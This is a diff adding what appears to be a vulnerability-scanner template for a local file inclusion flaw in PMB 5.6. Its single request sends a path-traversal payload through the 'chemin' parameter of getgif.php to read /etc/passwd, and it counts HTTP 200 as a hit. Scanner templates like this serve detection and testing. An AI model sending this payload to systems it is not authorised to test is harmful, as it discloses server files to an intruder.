@@ -1,0 +1,20 @@
+id: pmb-local-file-disclosure
+brief:
+    title: PMB 5.6 - Local File Inclusion
+    by: dhiyaneshDk
+    level: high
+    about: PMB 5.6 is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - pmb
+        - edb
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand_base(4)}}'
+      signs:
+        - "on": status
+          status:
+            - 200
